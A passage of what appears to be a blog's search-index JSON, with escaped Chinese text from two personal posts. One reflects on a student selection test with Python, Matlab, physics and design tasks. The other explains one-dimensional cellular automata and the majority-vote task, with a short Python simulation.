u662f\u60f3\u8be6\u7ec6\u5730\u6765\u8bf4\u8bf4\u505a\u9898\u65f6\u7684\u5177\u4f53\u611f\u53d7\u3002 \u5bf9\u4e8e\u9898\u76ee\u5177\u4f53\u5206\u6790\u548c\u76f8\u5173\u77e5\u8bc6\uff0c\u6211\u60f3\u6211\u5927\u6982\u4e5f\u8bb8\u53ef\u80fd\u4f1a\u5199\u4e00\u4e2a\u7cfb\u5217\u8be6\u7ec6\u4ecb\u7ecd\u5427\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e3b\u8981\u8bf4\u8bf4\u611f\u53d7\uff0c\u77e5\u8bc6\u6027\u53ef\u80fd\u4e0d\u4e00\u5b9a\u5f88\u5f3a\u3002","title":"\u8d77\u6e90"},{"location":"legacy/old_blog/20200318/#_3","text":"\u6d4f\u89c8\u4e86\u4e00\u904d\u62a5\u540d\u8868\u540e\uff0c\u6211\u5927\u6982\u5c06\u62a5\u540d\u8868\u5206\u6210\u4ee5\u4e0b\u51e0\u4e2a\u90e8\u5206\u3002 \u9898\u76ee\u5217\u8868 Module 1 Task 1\uff1aStory Board Task 2\uff1aAffective Diary Module 2 Section 1\uff1aMatlab Tilted Photos Image Processing Section 2 SolidWorks Multisim Python Assembly Section 3 Math in Epidemic Lagrangian Function in Physics Chemistry and Engineering \u5177\u4f53\u7684\u8981\u6c42\u662f\u5728Module 1\u4e2d\u9009\u62e9\u4e00\u4e2aTask\u5b8c\u6210\uff0c\u540c\u65f6\u8981\u6c42\u5b8c\u6210Module 2\u4e2d\u6bcf\u4e2aSection\u4e2d\u7684\u4e00\u9053\u9898\uff0c\u6240\u4ee5\u603b\u5171\u9700\u8981\u5b8c\u6210\u56db\u9053\u9898\uff0c\u63a5\u4e0b\u6765\u6211\u5c06\u4ee5\u6211\u7684\u7b54\u9898\u987a\u5e8f\u6765\u8bb2\u8bb2\u6211\u505a\u9898\u4e2d\u7684\u611f\u53d7\u548c\u60f3\u6cd5\u3002","title":"\u521d\u5165\u70bc\u72f1"},{"location":"legacy/old_blog/20200318/#_4","text":"","title":"\u7f13\u6162\u524d\u8fdb"},{"location":"legacy/old_blog/20200318/#python","text":"\u6211\u4e4b\u6240\u4ee5\u9009\u62e9Python\u5165\u624b\uff0c\u539f\u56e0\u662f\u5728\u90a3\u4e48\u591a\u9898\u4e2d\u6211\u76f8\u5bf9\u6bd4\u8f83\u719f\u6089\u3002\u800c\u4e14\u4ece\u8fd9\u6b21\u9898\u76ee\u4e2d\u6765\u770b\uff0c\u8fd9\u662f\u4e00\u9053\u76f8\u5bf9\u6bd4\u8f83\u7b80\u5355\u7684\u9898\uff0c\u53ea\u8981\u6c42\u4f60\u901a\u8fc7Pygame\u6765\u5b9e\u73b0\u4e00\u4e2a\u5b83\u6240\u8981\u6c42\u7684\u5c0f\u6e38\u620f\u5373\u53ef\u3002\u5c31\u6211\u4e2a\u4eba\u611f\u53d7\u800c\u8a00\uff0c\u6574\u4f53\u96be\u5ea6\u4e0d\u5927\uff0c\u7b97\u6cd5\u8981\u6c42\u4e0d\u9ad8\uff0c\u4e00\u822c\u6765\u8bf4\u51e0\u4e2a\u5c0f\u65f6\u5c31\u80fd\u5b8c\u6210\uff0c\u6240\u4ee5\u6211\u4e5f\u4e0d\u518d\u8d58\u8ff0\uff0c\u7b49\u4ee5\u540e\u7cfb\u5217\u535a\u6587\u91cc\u518d\u63d0\u5427\u3002\u53e6\u5916\uff0c\u628a\u5b83\u653e\u5728\u6700\u5148\u505a\uff0c\u8fd8\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63a8\u52a8\u6211\u53bb\u505a\u8868\uff0c\u4e00\u662f\u56e0\u4e3a\u589e\u5f3a\u4e86\u4fe1\u5fc3\uff0c\u4e8c\u662f\u6709\u4e86\u96be\u4ee5\u653e\u5f03\u7684\u6c89\u6ca1\u6210\u672c\uff0c\u563f\u563f\u3002","title":"Python"},{"location":"legacy/old_blog/20200318/#matlabtilted-photos","text":"\u8fd9\u9053\u9898\uff0c\u771f\u7684\u662f\u628a\u6211\u521a\u521a\u4ecePython\u5efa\u7acb\u8d77\u7684\u4fe1\u5fc3\u5f7b\u5f7b\u5e95\u5e95\u7684\u6253\u57ae\u4e86\u3002\u867d\u7136\u8bf4\u4e0a\u5b66\u671f\u6211\u65e9\u5c31\u628aMatlab\u5b89\u88c5\u4e86\uff0c\u4f46\u9876\u591a\u7528\u6765\u89e3\u89e3\u6570\u5b66\u9898\u4e4b\u7c7b\uff0c\u81f3\u4e8e\u5176\u4ed6\uff0c\u751a\u81f3\u5b83\u672c\u8eab\u7684\u8bed\u6cd5\u90fd\u4e0d\u592a\u4e86\u89e3\uff0c\u4f46\u4e5f\u53ea\u80fd\u786c\u7740\u5934\u76ae\u4e0a\u3002\u66f4\u52a0\u8ba9\u4eba\u5954\u6e83\u7684\u662f\uff0c\u5b83\u8981\u6c42\u4e0d\u80fd\u4f7f\u7528Matlab\u672c\u8eab\u63d0\u4f9b\u7684\u51fd\u6570\u6216\u8005Toolbox\u6765\u89e3\u51b3\u5173\u952e\u6b65\u9aa4\uff0c\u6362\u4e00\u53e5\u8bdd\u8bf4\uff0c\u5c31\u662f\u5173\u952e\u7b97\u6cd5\u8981\u81ea\u5df1\u53bb\u60f3\u3002\u6700\u540e\uff0c\u6211\u82b1\u4e86\u8fd1\u4e24\u5929\u65f6\u95f4\u5b66\u4e60\u4e86Matlab\u4ee5\u53ca\u6709\u5173\u56fe\u50cf\u5904\u7406\u8bc6\u522b\u7684\u4e00\u90e8\u5206\u77e5\u8bc6\uff0c\u624d\u52c9\u52c9\u5f3a\u5f3a\u5730\u5b8c\u6210\u4e86\u5b83\u4e00\u90e8\u5206\u7684\u8981\u6c42\u3002 \u6700\u540e\u5173\u4e8e\u795e\u7ecf\u7f51\u7edc\u90e8\u5206\uff0c\u7531\u4e8e\u65f6\u95f4\u539f\u56e0\uff0c\u6211\u662f\u6ca1\u6709\u5b8c\u6210\u7684\uff0c\u4e0d\u8fc7\u540e\u7eed\u6211\u4f1a\u8ddf\u8fdb\u5b66\u4e60\uff0c\u5e94\u8be5\u4f1a\u53d1\u5b66\u4e60\u535a\u6587\u7684\u5427\u3002\u603b\u4f53\u6765\u8bf4\uff0c\u6211\u5bf9\u81ea\u5df1\u8fd8\u662f\u6bd4\u8f83\u6ee1\u610f\u7684\uff0c\u6bd5\u7adf\u6211\u4e0d\u662f\u5927\u4f6c\uff0c\u53ea\u662f\u4e00\u4e2a\u5c0f\u83dc\u9e21\uff0c\u54b8\u9c7c\u53ef\u662f\u5f88\u5bb9\u6613\u81ea\u6211\u6ee1\u8db3\u7684~\uff0845\u5ea6\u4ef0\u671b\u5927\u4f6corz","title":"Matlab\uff1aTilted Photos"},{"location":"legacy/old_blog/20200318/#lagrangian-function-in-physics","text":"\u4ece\u5185\u5bb9\u4e0a\u6765\u770b\u5e94\u8be5\u662f\u4e00\u9053\u7406\u8bba\u7269\u7406\u9898\uff0c\u6beb\u65e0\u57fa\u7840\u7684\u6211\u5bf9\u7740\u76f8\u5173\u77e5\u8bc6\u8fdb\u884c\u4e00\u6ce2\u56eb\u56f5\u541e\u67a3\uff0c\u52c9\u5f3a\u4f5c\u51fa\u4e86\u4e00\u90e8\u9898\u76ee\uff0c\u4e0d\u8fc7\u540e\u9762\u9047\u5230\u4e86\u65e0\u6cd5\u63a5\u7684\u591a\u5143\u5fae\u5206\u65b9\u7a0b\u7ec4\u7684\u95ee\u9898\uff0c\u4e8e\u662f\u5c31\u96be\u4ee5\u8fdb\u884c\u4e0b\u53bb\u3002\u6211\u4e2a\u4eba\u5176\u5b9e\u5bf9\u8fd9\u9053\u9898\u633a\u9057\u61be\u7684\uff0c\u6bd5\u7adf\u611f\u89c9\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u7b97\u4e86\uff0c\u90fd\u8fc7\u53bb\u4e86\u3002\u672c\u6765\u5c31\u662f\u4e34\u65f6\u5b66\u7684\uff0c\u57fa\u7840\u5565\u4e5f\u6ca1\u6709\uff0c\u5c31\u8fd9\u6837\u5427\u3002","title":"Lagrangian Function in Physics"},{"location":"legacy/old_blog/20200318/#affective-diary","text":"\u8fd9\u4e00\u90e8\u5206\u5c31\u6bd4\u8f83\u7b80\u7b54\u4e86\uff0c\u7531\u4e8e\u8003\u5bdf\u7684\u662f\u827a\u672f\u5ba1\u7f8e\u548c\u4eba\u6587\u7d20\u517b\uff0c\u6240\u4ee5\u5927\u6982\u5c31\u662f\u5f88\u7384\u5b66\u5427\u3002\u5148\u8981\u6c42\u53bb\u8bfb\u4e00\u7bc7\u82f1\u6587\u8bba\u6587\uff08\u597d\u50cf\u662f\u5fae\u8f6f\u7814\u7a76\u9662\u7684\uff0c\u4e0d\u8fc7\u4e2a\u4eba\u611f\u89c9\u6ca1\u5565\u5e2e\u52a9\u3002\u4e4b\u540e\u4fbf\u662f\u8981\u6c42\u5236\u4f5c\u4e00\u4efd\u5c5e\u4e8e\u81ea\u5df1\u7684Affective Diary\uff0c\u624b\u7ed8\u3001\u7535\u8111\u5236\u56fe\u90fd\u884c\u3002\u6211\u9009\u62e9\u4e86\u7528Ps\uff0c\u6700\u6df1\u7684\u611f\u53d7\u5c31\u662f\uff0c\u6211\u5bf9\u7f8e\u672f\u5b8c\u4e86\uff01\uff01\uff01\u505a\u5230\u8fd9\u91cc\u6211\u5df2\u7ecf\u4f5b\u7cfb\u4e86\uff0c\u4e00\u5207\u968f\u7f18\u7684\u6211\u5df2\u7ecf\u628a\u505a\u5b8c\u8868\u5f53\u4f5c\u76ee\u6807\u4e86\u3002\u8d28\u91cf\u4ec0\u4e48\u7684\u90fd\u4e00\u8fb9\u53bb\uff01","title":"Affective Diary"},{"location":"legacy/old_blog/20200318/#_5","text":"\u867d\u7136\u8bf4\u622a\u6b62\u65f6\u95f4\u662f\u4eca\u5929\u65e9\u4e0a11:00\uff0c\u4e0d\u8fc7\u6211\u8fd8\u662f\u5728\u6628\u5929\u665a\u4e0a\u5c31\u7126\u8651\uff0c\u6bd5\u7adf\u65e9\u4ea4\u65e9\u8d85\u751f\uff0c\u5b9e\u9645\u4e0a\u662f\u56e0\u4e3a\u6211\u505a\u4e0d\u51fa\u6765\u4e86\u3002\u540e\u9762\u8fd8\u6709\u4e09\u8f6e\u7684\u8003\u6838\uff0c\u5982\u679c\u6211\u80fd\u82df\u8fdb\u540e\u9762\u51e0\u8f6e\u8003\u6838\uff0c\u6211\u4e5f\u4f1a\u5199\u76f8\u5173\u5185\u5bb9\u7684\uff08\u5c3d\u91cf\u3002 \u4e0d\u8fc7\u6709\u4e00\u8bf4\u4e00\uff0c\u6211\u8fd8\u662f\u5e0c\u671b\u7b2c\u4e00\u8f6e \u88ab\u5237\u4e5f\u4e0d\u8981\u6700\u540e\u4e00\u8f6e\u88ab\u5237\u3002 \u8fd8\u6709\uff0c\u6211\u53d1\u73b0\u8fd9\u6b21\u53ef\u80fd\u7531\u4e8e\u75ab\u60c5\u5728\u5bb6\u7684\u539f\u56e0\uff0c\u7adf\u7136\u53ea\u670987\u4eba\u53c2\u4e0e\u4e86\u62a5\u540d\uff0c\u5f55\u53d6\u7387\u9ad8\u8fbe46%\uff01\u4f46\u662f\u6211\u77e5\u9053\uff0c\u8fd9\u8fd8\u662f\u5927\u4f6c\u7684\u6218\u4e89\uff0c\u5927\u4f6c\u7684\u5e73\u5747\u6c34\u5e73\u2026\u2026. \u5bb3\uff0c\u4e0d\u8bf4\u4e86\uff0c\u6211\u8981\u597d\u597d\u4f11\u606f\u8c03\u6574\u4e00\u4e0b\u4e86zzzzzzzzzz","title":"\u540e\u8bb0"},{"location":"legacy/old_blog/20200328/","text":"\u5143\u80de\u81ea\u52a8\u673a \u00b6 \u7ea6 1033 \u4e2a\u5b57 54 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f \u5199\u5728\u524d\u9762 \u521a\u521a\u7ed3\u675f\u4e86\u5de5\u9ad8\u7684\u7b2c\u4e8c\u8f6e\u9762\u8bd5\u2014\u2014\u5b9e\u8df5\u9762\u8bd5\uff0c\u6574\u4e00\u4e2a\u9762\u8bd5\u662f\u8981\u6c42\u4e00\u4e2a\u56e2\u961f\u4e00\u8d77\u5408\u4f5c\u5728\u4e09\u5929\u5185\u5b8c\u6210\u51e0\u9053\u6570\u5b66\u5efa\u6a21\u9898\uff0c\u8fc7\u7a0b\u7279\u809d\uff0c\u6211\u771f\u7684\u53ef\u80fd\u628a\u6bcf\u9053\u9898\u7684\u5206\u6790\u90fd\u7801\u4e0a\u6765\u4e86\u3002\u6240\u4ee5\u6211\u5c31\u7b80\u8981\u7684\u63d0\u4e00\u4e0b\u5176\u4e2d\u63a5\u89e6\u5230\u7684\u77e5\u8bc6\u5427\u3002\u4eca\u5929\uff0c\u6211\u5c31\u6765\u7b80\u8981\u8bf4\u8bf4 \u5143\u80de\u81ea\u52a8\u673a \u7684\u4e00\u4e9b\u77e5\u8bc6\u5427\u3002 \u672c\u6587\u5199\u4e8e2020\u5e743\u670828\u65e5\uff0c\u73b0\u6574\u7406\u6536\u5f55\u3002 \u5143\u80de\u81ea\u52a8\u673a\uff08CA\uff09 \u5b83\u662f\u4e00\u79cd\u65f6\u95f4\u3001\u7a7a\u95f4\u3001\u72b6\u6001\u90fd\u79bb\u6563\u7684\uff0c\u7a7a\u95f4\u76f8\u4e92\u4f5c\u7528\u548c\u56e0\u679c\u5173\u7cfb\u4e3a\u5c40\u90e8\u7684\u7f51\u683c\u52a8\u529b\u5b66\u6a21\u578b\u3002\u5176\u4e2d\u91cd\u8981\u7684\u90e8\u5206\u662f\u89c4\u5219\u548c\u90bb\u5c45\uff0c\u8fd9\u4e24\u4e2a\u8981\u7d20\u51b3\u5b9a\u4e86\u5143\u80de\u81ea\u52a8\u673a\u7684\u6f14\u5316\u8fc7\u7a0b\u3002\u5176\u6700\u51fa\u540d\u7684\u4fbf\u662f\u975e\u5e38\u6d41\u884c\u7684\u201c\u751f\u547d\u6e38\u620f\u201d\u3002 \u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a \u00b6 \u4e3a\u4e86\u7b80\u5316\uff0c\u6240\u4ee5\u4ece\u7b80\u5355\u7684\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a\u8bf4\u8d77\u3002 \u5176\u662f\u7531\u4e00\u884c\u5143\u80de\u6784\u6210\uff0c\u6bcf\u4e2a\u5143\u80de\u7684\u72b6\u6001\u67091\u62160\u4e24\u4e2a\u72b6\u6001 \uff0c\u8fd9\u6574\u4e00\u884c\u5143\u80de\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5143\u80de\u81ea\u52a8\u673a\u3002\u5176\u4e0b\u4e00\u4ee3\u7684\u6f14\u5316\u65b9\u5f0f\u662f\u7531\u6bcf\u4e2a\u5143\u80de\u76f8\u90bb\u7684N\u4e2a\u5143\u80de\u72b6\u6001\u548c\u81ea\u8eab\u7684\u72b6\u6001\u5f62\u6210\u7684N+1\u90bb\u57df\u5171\u540c\u51b3\u5b9a\u3002 \u5f53N=2\u65f6\uff0c\u5373\u6bcf\u4e2a\u5143\u80de\u548c\u5176\u76f8\u90bb\u7684\u5de6\u53f3\u4e24\u4e2a\u5143\u80de\u7684\u72b6\u6001\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u7684\u72b6\u6001\uff0c\u5177\u4f53\u5982\u4f55\u751f\u6210\u5462\uff0c\u8fd9\u91cc\u5148\u7528\u4e00\u79cd\u7b80\u5355\u7684\u89c4\u5219\u52a0\u4ee5\u5c55\u793a\u3002 \u5f88\u5bb9\u6613\u5f97\u5230\uff0c3\u90bb\u57df\u7684\u5143\u80de\u72b6\u6001\u603b\u5171\u67092^3=8\u79cd\u72b6\u6001\uff0c\u5982\u4e0b\uff1a 000 001 010 011 100 101 110 111 \u5176\u6bcf\u4e00\u4e2a\u72b6\u6001\u90fd\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u72b6\u6001\uff0c\u5982 0 0 0 0 1 1 1 1 \u90a3\u4e48\u89c4\u5219\u5c31\u53ef\u4ee5\u4ee5 00001111 \u6765\u8868\u793a\uff0c\u79f0\u5176\u4e3a\u89c4\u5219\u6570\u3002 \u4ee5\u4e0a\u5c31\u662f\u4e00\u79cd\u4ea7\u751f\u89c4\u5219\uff0c\u4f46\u662f\u6211\u4eec\u5f88\u5feb\u4f1a\u53d1\u73b0\u8fd9\u6837\u4f1a\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u5728\u4e24\u7aef\u7684\u4f1a\u51fa\u73b0\u76f8\u90bb\u5143\u80de\u6570\u4e0d\u8db3\u7684\u73b0\u8c61\u3002\u6b64\u65f6\u4e00\u822c\u4f1a\u91c7\u7528\u9996\u5c3e\u76f8\u8fde\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\u3002 \u6295\u7968\u673a \u00b6 \u4e3a\u4e86\u66f4\u597d\u7684\u7406\u89e3\u5143\u80de\u81ea\u52a8\u673a\uff0c\u8fd9\u91cc\u7528\u4e00\u4e2a\u7b80\u5355\u7684\u6848\u4f8b\u6765\u5c55\u793a\u3002 \u4e00\u4e2a\u6709 n \u4e2a\u5143\u80de\u7684\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a\uff0c\u80fd\u8f83\u597d\u5b9e\u73b0\u201c\u5c11\u6570\u670d\u4ece\u591a\u6570\u201d\u7684\u4efb\u52a1\uff1a\u82e5\u8f93\u5165\uff08t0 = 0\uff09\u4e2d \u72b6\u6001\u4e3a 1 \u7684\u5143\u80de\u591a\u4e8e\u72b6\u6001\u4e3a 0 \u7684\u5143\u80de\uff0c\u5219\u7ecf\u8fc7 t \u6b21\u8fd0\u7b97\u540e\u6240\u6709\u5143\u80de\u72b6\u6001\u4e3a 1\uff1b\u540c\u7406\uff0c\u82e5\u8f93\u5165\uff08t0 = 0\uff09 \u4e2d\u72b6\u6001\u4e3a 0 \u7684\u5143\u80de\u591a\u4e8e\u72b6\u6001\u4e3a 1 \u7684\u5143\u80de\uff0c\u5219\u7ecf\u8fc7 t \u6b21\u8fd0\u7b97\u540e\u6240\u6709\u5143\u80de\u72b6\u6001\u4e3a 0\u3002\u8bf7\u5236\u5b9a\u89c4\u5219\uff0c\u4f7f\u5f97\u9002\u5e94\u5ea6\u5c3d\u53ef\u80fd\u7684\u9ad8\u3002 \u6839\u636e\u4e0a\u9762\u7684\u89e3\u91ca\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u884c\u5c1d\u8bd5\u3002 \u8fd9\u91cc\u6211\u7ed9\u51fa\u6700\u4f18\u89e3\u6cd5\uff1a \u9009\u53d67\u90bb\u57df\u4f5c\u4e3a\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u7684\u72b6\u6001\u7ec4\uff0c\u8fd9\u6837\u89c4\u5219\u6570\u5c31\u67092^7=128\u4f4d \u89c4\u5219\u6570\uff1a 00000101000001100001010110000111000001110000010000010101010101110110010001110111 000001010000000101111101111111111011011101111111 \u63a5\u4e0b\u6765\u65e2\u53ef\u4ee5\u91c7\u53d6\u9996\u5c3e\u76f8\u8fde\u7684\u65b9\u5f0f\u4e5f\u53ef\u4ee5\uff0c\u7a0d\u5fae\u4e0e\u5143\u80de\u81ea\u52a8\u673a\u5b9a\u4e49\u6709\u6240\u5dee\u522b\u7684\u6574\u4f53\u4f18\u52bf\u8865\u5168\u6cd5\uff0c\u5373\u7528\u4e0a\u4e00\u4ee3\u72b6\u6001\u4e2d\u5360\u4f18\u52bf\u7684\u72b6\u6001\u6765\u8865\u9f50\u9996\u5c3e\u3002 \u4e4b\u6240\u4ee5\u6709\u6240\u4e0d\u59a5\uff0c\u662f\u56e0\u4e3a\u8fd9\u91cc\u6709\u70b9\u7c7b\u4f3c[^\u51af\u8bfa\u4f9d\u66fc\u673a]\u7684\u4e00\u6b65\u5230\u4f4d\u7684\u60f3\u6cd5\uff0c\u4f46\u662f\u91c7\u53d6\u8fd9\u6837\u7684\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u9002\u5e94\u5ea6\u8fbe\u5230100%\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u91c7\u7528\u4e86\u6574\u4f53\u4f18\u52bf\u8865\u5168\u7684\u65b9\u6cd5\u3002 Python\u5b9e\u73b0\u4ee3\u7801 from random import randint def getBirth ( N ): f =- 1 while f ==- 1 : #\u907f\u514d\u4ea7\u751f1\u548c0\u6570\u76ee\u76f8\u540c\u7684\u521d\u59cb\u72b6\u6001 s = '' for i in range ( N ): s += str ( randint ( 0 , 1 )) if s . count ( '0' ) > s . count ( '1' ): f = 0 elif s . count ( '0' ) == s . count ( '1' ): f =- 1 else : f = 1 return s , f def getNext ( n , f ): rule = '0000010100000110000101011000 \\ 011100000111000001000001010101 \\ 010111011001000111011100000101 \\ 0000000101111101111111111011011101111111' nextGeneration = '' N = len ( n ) for i in range ( N ): #\u8fb9\u7f18\u5355\u72ec\u8003\u8651\u8865\u5168 if i < 3 : s = str ( f ) * ( 3 - i ) + n [ 0 : i ] + n [ i : i + 4 ] elif i > N - 4 : s = n [ i - 3 : i ] + n [ i : N ] + str ( f ) * ( 3 - ( N - 1 - i )) else : s = n [ i - 3 : i ] + n [ i : i + 4 ] s = int ( s , 2 ) nextGeneration += rule [ s ] return nextGeneration def main (): num = 0 ; #\u8bb0\u5f55\u6210\u529f\u6b21\u6570 datas = 200 #\u6d4b\u8bd5\u6570\u636e\u603b\u6570 for i in range ( datas ): N = 100 #\u5e8f\u5217\u957f\u5ea6 t = 0 #\u8bb0\u5f55\u65f6\u95f4 n , f = getBirth ( N ) #\u751f\u6210\u521d\u59cb\u72b6\u6001 while t < 300 : #\u8d85\u8fc7300\u6b21\uff0c\u9ed8\u8ba4\u5224\u5b9a\u65e0\u6cd5\u6210\u529f n = getNext ( n , f ) t += 1 if ( f == 0 and n . count ( '0' ) == N ) or ( f == 1 and n . count ( '1' ) == N ): #\u5224\u65ad\u662f\u5426\u6210\u529f num += 1 break # \u8f93\u51fa\u7ed3\u679c print ( 'datas sum:' , datas ) print ( int ( num / datas * 100 ), '%' ) if __name__ == '__main__' : main () input () \u968f\u4fbf\u8bf4\u8bf4 \u00b6 \u8fd9\u91cc\u6211\u5c31\u6682\u65f6\u8bf4\u5230\u8fd9\u91cc\u4e86 \u4e3b\u8981\u592a\u61d2\u4e86\uff0c\u4e0d\u60f3\u7801\u5b57\u4e86 \uff0c\u81f3\u4e8e\u89c4\u5219\u662f\u5982\u4f55\u4ea7\u751f\u7684\uff0c\u5404\u4f4d\u53ef\u4ee5\u53bb\u53c2\u8003 \u9057\u4f20\u7b97\u6cd5 \uff0c\u6211\u5728\u8fd9\u91cc\u4e5f\u63a8\u8350\u4e00\u672c\u4e66\uff0c\u8bb2\u7684\u633a\u7b80\u5355\u7684\u3002 \u300a\u590d\u6742\u300b \u6885\u62c9\u59ae\u00b7\u7c73\u6b47\u5c14 \u300aComplexity: A Guided Tour\u300b Melanie Mitchell \u8fd9\u4e0a\u9762\u662f\u4e00\u672c\u4e66\u54e6\uff0c\u53ea\u662f\u4e2d\u82f1\u6587\u7684\u533a\u522b~ \u5199\u5728\u6700\u540e \u00b6 \u5176\u5b9e\u5143\u80de\u81ea\u52a8\u673a\u672c\u8eab\u5e76\u4e0d\u590d\u6742\uff0c\u4f46\u662f\u53ef\u4ee5\u6a21\u62df\u5f88\u591a\u590d\u6742\u7684\u73b0\u8c61\uff0c\u5728\u8fd9\u6b21\u5b9e\u8df5\u9762\u8bd5\u4e2d\u8fd8\u5b9e\u73b0\u4e86\u957f\u4e09\u89d2\u57ce\u5e02\u5efa\u6210\u533a\u7684\u6a21\u62df\u3001\u8fd8\u6709\u6559\u5ba4\u9003\u751f\u7684\u6a21\u62df\u7b49\u7b49\uff0c\u6709\u5174\u8da3\u7684\u8bdd\uff0c\u53ef\u4ee5\u6df1\u5165\u4e86\u89e3\u3002 \u8fd9\u6b21\u8bb2\u7684\u5f88\u6d45\uff0c\u7b49\u6211\u6709\u5174\u8da3\u7801\u5b57\u4e86\uff0c\u518d\u8be6\u7ec6\u5c55\u5f00\u8bb2\u8bb2\uff08\u9003","title":"\u5143\u80de\u81ea\u52a8\u673a"},{"location":"legacy/old_blog/20200328/#_1","text":"\u7ea6 1033 \u4e2a\u5b57 54 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 4 \u5206\u949f \u5199\u5728\u524d\u9762 \u521a\u521a\u7ed3\u675f\u4e86\u5de5\u9ad8\u7684\u7b2c\u4e8c\u8f6e\u9762\u8bd5\u2014\u2014\u5b9e\u8df5\u9762\u8bd5\uff0c\u6574\u4e00\u4e2a\u9762\u8bd5\u662f\u8981\u6c42\u4e00\u4e2a\u56e2\u961f\u4e00\u8d77\u5408\u4f5c\u5728\u4e09\u5929\u5185\u5b8c\u6210\u51e0\u9053\u6570\u5b66\u5efa\u6a21\u9898\uff0c\u8fc7\u7a0b\u7279\u809d\uff0c\u6211\u771f\u7684\u53ef\u80fd\u628a\u6bcf\u9053\u9898\u7684\u5206\u6790\u90fd\u7801\u4e0a\u6765\u4e86\u3002\u6240\u4ee5\u6211\u5c31\u7b80\u8981\u7684\u63d0\u4e00\u4e0b\u5176\u4e2d\u63a5\u89e6\u5230\u7684\u77e5\u8bc6\u5427\u3002\u4eca\u5929\uff0c\u6211\u5c31\u6765\u7b80\u8981\u8bf4\u8bf4 \u5143\u80de\u81ea\u52a8\u673a \u7684\u4e00\u4e9b\u77e5\u8bc6\u5427\u3002 \u672c\u6587\u5199\u4e8e2020\u5e743\u670828\u65e5\uff0c\u73b0\u6574\u7406\u6536\u5f55\u3002 \u5143\u80de\u81ea\u52a8\u673a\uff08CA\uff09 \u5b83\u662f\u4e00\u79cd\u65f6\u95f4\u3001\u7a7a\u95f4\u3001\u72b6\u6001\u90fd\u79bb\u6563\u7684\uff0c\u7a7a\u95f4\u76f8\u4e92\u4f5c\u7528\u548c\u56e0\u679c\u5173\u7cfb\u4e3a\u5c40\u90e8\u7684\u7f51\u683c\u52a8\u529b\u5b66\u6a21\u578b\u3002\u5176\u4e2d\u91cd\u8981\u7684\u90e8\u5206\u662f\u89c4\u5219\u548c\u90bb\u5c45\uff0c\u8fd9\u4e24\u4e2a\u8981\u7d20\u51b3\u5b9a\u4e86\u5143\u80de\u81ea\u52a8\u673a\u7684\u6f14\u5316\u8fc7\u7a0b\u3002\u5176\u6700\u51fa\u540d\u7684\u4fbf\u662f\u975e\u5e38\u6d41\u884c\u7684\u201c\u751f\u547d\u6e38\u620f\u201d\u3002","title":"\u5143\u80de\u81ea\u52a8\u673a"},{"location":"legacy/old_blog/20200328/#_2","text":"\u4e3a\u4e86\u7b80\u5316\uff0c\u6240\u4ee5\u4ece\u7b80\u5355\u7684\u4e00\u7ef4\u5143\u80de\u81ea\u52a8\u673a\u8bf4\u8d77\u3002 \u5176\u662f\u7531\u4e00\u884c\u5143\u80de\u6784\u6210\uff0c\u6bcf\u4e2a\u5143\u80de\u7684\u72b6\u6001\u67091\u62160\u4e24\u4e2a\u72b6\u6001 \uff0c\u8fd9\u6574\u4e00\u884c\u5143\u80de\u5c31\u6784\u6210\u4e86\u4e00\u4e2a\u5143\u80de\u81ea\u52a8\u673a\u3002\u5176\u4e0b\u4e00\u4ee3\u7684\u6f14\u5316\u65b9\u5f0f\u662f\u7531\u6bcf\u4e2a\u5143\u80de\u76f8\u90bb\u7684N\u4e2a\u5143\u80de\u72b6\u6001\u548c\u81ea\u8eab\u7684\u72b6\u6001\u5f62\u6210\u7684N+1\u90bb\u57df\u5171\u540c\u51b3\u5b9a\u3002 \u5f53N=2\u65f6\uff0c\u5373\u6bcf\u4e2a\u5143\u80de\u548c\u5176\u76f8\u90bb\u7684\u5de6\u53f3\u4e24\u4e2a\u5143\u80de\u7684\u72b6\u6001\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u7684\u72b6\u6001\uff0c\u5177\u4f53\u5982\u4f55\u751f\u6210\u5462\uff0c\u8fd9\u91cc\u5148\u7528\u4e00\u79cd\u7b80\u5355\u7684\u89c4\u5219\u52a0\u4ee5\u5c55\u793a\u3002 \u5f88\u5bb9\u6613\u5f97\u5230\uff0c3\u90bb\u57df\u7684\u5143\u80de\u72b6\u6001\u603b\u5171\u67092^3=8\u79cd\u72b6\u6001\uff0c\u5982\u4e0b\uff1a 000 001 010 011 100 101 110 111 \u5176\u6bcf\u4e00\u4e2a\u72b6\u6001\u90fd\u51b3\u5b9a\u4e0b\u4e00\u4ee3\u72b6\u6001\uff0c\u5982 0 0 0 0 1 1 1 1 \u90a3\u4e48\u89c4\u5219\u5c31\u53ef\u4ee5\u4ee5 00001111 \u6765\u8868\u793a\uff0c\u79f0\u5176\u4e3a\u89c4\u5219\u6570\u3002 